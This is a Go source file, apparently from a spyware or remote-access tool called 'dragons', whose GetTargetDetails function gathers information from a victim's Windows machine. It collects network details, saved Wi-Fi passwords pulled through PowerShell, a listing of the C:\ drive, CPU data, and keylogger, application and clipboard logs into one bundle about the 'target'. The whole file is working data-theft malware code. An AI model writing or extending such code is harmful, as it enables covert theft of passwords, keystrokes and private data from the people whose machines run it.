package gather

import (
	ps "github.com/bhendo/go-powershell"

	"github.com/d0minikt/dragons/lib"
)

func GetTargetDetails(shell ps.Shell, keylog, applog, clipboardlog []string) lib.TargetDetails {
	// net details
	netDetails, err := GetTargetNetDetails()
	if err != nil {
		panic("Error getting the target details")
	}
	// wifi passwords
	wifiPasswords, err := GetWifiPasswords(shell)

	// directory
	dir, err := lib.GetDirectory("C:\\")
	if err != nil {
		panic(err)
	}

	return lib.TargetDetails{
		Net:  netDetails,
		Wifi: wifiPasswords,
		Hardware: lib.HardwareInfo{
			CPU: GetCPU(shell),
		},
		Keylog:       keylog,
		Applog:       applog,
		Clipboardlog: clipboardlog,
		Directory:    dir,
	}
}
